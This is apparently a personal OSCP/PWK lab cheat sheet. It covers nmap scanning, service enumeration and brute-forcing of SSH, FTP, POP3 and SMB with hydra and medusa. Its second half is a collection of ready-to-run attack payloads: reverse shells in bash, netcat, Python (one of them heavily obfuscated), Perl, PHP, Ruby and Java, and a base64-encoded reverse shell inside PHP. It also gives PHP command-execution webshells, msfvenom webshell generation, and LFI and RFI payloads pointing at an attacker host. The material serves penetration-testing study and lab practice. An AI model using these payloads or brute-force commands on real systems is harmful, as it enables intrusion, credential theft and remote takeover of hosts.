## automate VPN
creating txt file to automate vpn authentication
```sh
tar xvzf file.tar.gz  
echo 'OS-#####' > cred.txt  
echo ' #######' >> cred.txt  
vi auth-user-pass cred.txt  
openvpn OS-####-PWK.ovpn 
```

## Default Nmap Scanning<br />
```sh
nmap -sU -sV -n --top-ports 200 192.168.1.30  > /root/PWK-Lab/192.168.1.30/nmap-udp<br />
nmap -sT -sV -A -O -v -p 1-65535 192.168.1.30 > /root/PWK-Lab/192.168.1.30/nmap-tcp<br />
```
-sS stealth scanning<br />
```sh
nmap -vv -Pn -A -sC -sS -T 4 -p- 10.x.x.x<br />
nmap -p- -sS -A 10.x.x.x<br />
```
Vulnerability Scanning :  ``` nmap -sS -sV --script=vulscan/vulscan.nse 10.x.x.x ```<br />
OS detection :  ``` nmap -O -v 10.x.x.x ```<br /><br />

Automated scanning tools<br />
[Reconnoitre : ](https://github.com/codingo/Reconnoitre)
```python /root/Recon/Reconnoitre/reconnoitre.py -t 10.x.x.x -o /root/PWK-Lab/10.x.x.x/ --services``` <br />
[OneTwoPunch : ](https://github.com/superkojiman/onetwopunch)
```vi targets.txt; onetwopunch.sh -t targets.txt -p all -n "-sV -O --version-intensity=9" ```<br />

unicornscan -i tap0 -I -mT 10.x.x.x:a <br />
masscan -p0-65535 10.x.x.x --rate 150000 -oL output.txt <br />

## Scanning per protocols...
## - **SSH(22)** <br />
Bruteforce : <br />
```sh
nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=users.txt --script-args ssh-brute.timeout=4s 10.x.x.x 
hydra -l user -P /usr/share/wordlists/rockyou.txt  10.x.x.x ssh -t 4
```
ref : https://github.com/g0tmi1k/debian-ssh  && https://blog.g0tmi1k.com/2010/04/pwnos/ <br />
OpenF*** (Apache mod_ssl < 2.8.7 OpenSSL) 764.c <br />

## - **FTP(21)** <br />
Default cred : anonymous/anonymous | ftp/ftp | ftpuser|ftpuser<br />

```sh
nmap -sV -Pn -vv -p 21  --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 10.x.x.x
nmap --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 10.x.x.x
check windows OS files : https://www.quora.com/How-can-I-tell-what-version-of-Windows-is-installed-on-a-hard-drive-without-booting-it 
```
Bruteforce : <br />
```sh
medusa -h 10.x.x.x -u user -P /root/SecLists/Passwords/bt4-password.txt -M ftp 
./root/PWK-Lab/FTP/ftp-user-enum-1.0/ftp-user-enum.pl -U /root/PWK-Lab/fuzzdb/bruteforce/names/simple-users.txt -t 10.x.x.x" 
```

## - **SMTP(25)**<br />
**vulnerability check** <br />
```sh 
nmap --script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.x.x.x 
```
**enumerating users** <br />
```sh 
nmap --script smtp-enum-users.nse 10.x.x.x

smtp-user-enum -M VRFY -U users.txt -t 10.x.x.x
smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 10.x.x.x
smtp-user-enum -M VRFY -U  /usr/share/seclists/Usernames/Names/names.txt -t 10.x.x.x
```
connecting to mailsvr: <br />
```sh 
telnet IPADDRESS 25
nc -nvv IPADDRESS 25
```
msf module : auxiliary/scanner/smtp/smtp_enum<br />

## -  **POP3(110)**<br />
**Bruteforce** : ```hydra -L usr.txt -P /usr/share/wordlists/fasttrack.txt -t20 10.x.x.x -s55007 -I pop3```<br />

POP3 command
```sh 
USER boris
PASS *****
LIST 
RETR 1 
```

## -  **SNMP(161)**<br />
**Default Community Strings** : public/private/manager<br />

```sh 
snmp-check -t [IP] -c public 
snmpwalk -c public -v1 10.0.0.0 
nmap -sU --open -p 161 10.11.1.0/24 -oG mega-snmp.txt 
sudo nmap -sU -p 161 --script default,snmp-sysdescr 10.11.1.0/24 
onesixtyone -c community -i ips 
```
cf. for ip in $(seq 1 254); do echo 10.11.1.$ip; done > ips<br />
```sh 
nmap 10.11.1.* -p161 --open -oG - | awk '/161\/open/{print $2}' 
```

 
## -  **SMB(139,445)**<br />
Checking SMB port open/running : 
```sh 
nmap -A -p 139,445 10.11.1.1-254 -oG smb_service.txt; grep Up smb_service.txt | cut -d "" "" -f 2  
nmap 10.11.1.* -p139,445 --open -oG - | awk '/139\/open.*445\/open/{print $2}'  
```
**vulnerability scanning** : ```nmap -p 139,135,445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 10.x.x.x```

**enumerating users** : ```nmap --script smb-enum-users.nse -p445 10.x.x.x  ```
```nmap -sU -sS --script smb-enum-users.nse -p U:137,T:139 10.x.x.x  ```


**smbclient**<br />
```sh 
smbclient -L //10.x.x.x/share -U user 
smbclient //10.x.x.x//IPC$ -N  
```
**checking access** <br />
```sh 
acccheck -v -t 10.x.x.x  -u user -P /usr/share/dirb/wordlists/common.txt  
acccheck -v -t 10.x.x.x -U /root/Vulnhub/Stapler/user.txt  -P /usr/share/dirb/wordlists/common.txt  
```
**smbmap**<br />
```sh 
smbmap -u user -p user -d share -H 10.x.x.x  
smbmap -u user -p .bash_history -d share -H 10.x.x.x  
smbmap -H 10.x.x.x\share -u user -p '.bash_history' -L  
```
ref : https://hackercool.com/2016/07/smb-enumeration-with-kali-linux-enum4linuxacccheck-smbmap/<br />


## MISC

- metasploit issue : <br />
sudo apt-get update <br />
service postgresql restart <br />
msfdb reinit  <br />
cf : https://github.com/rapid7/metasploit-framework/issues/9556 <br />

<br />

## Windows Shell
```sh 
//Non-Staged :  (windows/shell_reverse_tcp) && nc -nlvp 443
//Staged     : (windows/shell/reverse_tcp) && use exploit/multi/handler
```

**-netcat**
```sh 
//Windows(Victim) : nc.exe 10.11.0.69 4444 -e cmd.exe
//eg. C:\Inetpub\Scripts\nc.exe -nv 10.11.0.45 1234 -e C:\WINDOWS\System32\cmd.exe
//Kali(Attacker) : nc -nlvp 4444
```
**-Creating Webshell**
```sh 
ASP : msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.45 LPORT=2323 -f asp -a x86 --platform win -o shell.asp
      
JSP : msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.42 LPORT=4444 -f raw > shell.jsp
    <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
      
PHP : <?php echo passthru($_GET['cmd']); ?>
      <?php echo shell_exec($_GET['cmd']); ?>
```
ref : https://netsec.ws/?p=331

**-Python Oneliner ReverseShell on CMD**  *Make sure updating IP address and Port. *
```sh 
C:\Python26\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.*.*.*', ***)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```
```sh 
powershell -exec bypass -c Import-Module .\Invoke-PowerShellTcp.ps1;Invoke-PowerShellTcp -Reverse -IPAddress 10.*.*.* -Port ****
```
ref : https://github.com/samratashok/nishang<br />

**Powershell location**<br />
```sh 
-32-bit (x86) PowerShell executable C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe  
-64-bit (x64) Powershell executable C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe  
```

## Local File Inclusion (LFI) 
Put files locally on the target and trigger webshell by browsing the page. <br />
```sh 
http://target.com/?page=home
http://target.com/?page=./../../../../../../../../../etc/passwd%00
```
eg. https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion <br />

## Remote File Inclusion (RFI) 
Browse a remote page and trigger (remote) webshell page. <br />
```sh 
http://target.com/?page=http://attackerIP/evil.txt%00
```


## Linux Spawning a Reverse Shell
**-Netcat** <br />
```sh 
Target : 
bash -i >& /dev/tcp/192.*.*.*/* 0>&1 
nc -e /bin/sh 10.0.0.* 1234
//without -e : rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.* 1234 >/tmp/f
Attacker : nc -nlvp 443
```

**-Python** <br />
```sh 
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.*"",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""]);'
```

**-PHP** <br />
```sh 
php -r '$sock=fsockopen(""10.0.0.*"",1234);exec(""/bin/sh -i <&3 >&3 2>&3"");' 
//creating webshell php
echo '<?php echo shell_exec(""/bin/nc -nvv 10.*.*.* 443 -e /bin/sh"") ?>' > index1.php
echo '<?php $sock=fsockopen(""10.*.*.*"",443);exec(""/bin/sh -i <&3 >&3 1>&3"");?>' > index2.php
echo '<?php echo shell_exec(""/bin/bash -i > /dev/tcp/10.11.0.42/443 0<&1 2>&1"");?>' > index3.php
```
creating webshell with msfvenom
```sh 
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.* LPORT=443  -f asp > shells.asp
```

**-Perl** <br />
```sh 
perl -e 'use Socket;$i="10.0.0.*";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Perl script base64 encoded inside php 
```sh 
<?phpshell_exec(base64_decode("cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTAuMTEuMC4zNyI7JHA9MTIzNDtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL3NoIC1pIik7fTsn"))?>
``` 

**-Ruby** <br />
```sh 
ruby -rsocket -e'f=TCPSocket.open("10.0.0.*",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

**-Java** <br />
```sh 
r = Runtime.getRuntime()
p = r.exec([""/bin/bash"",""-c"",""exec 5<>/dev/tcp/10.0.0.*/1234;cat <&5 | while read line; do \$line 2>&5 >&5; done""] as String[])
p.waitFor()"
```
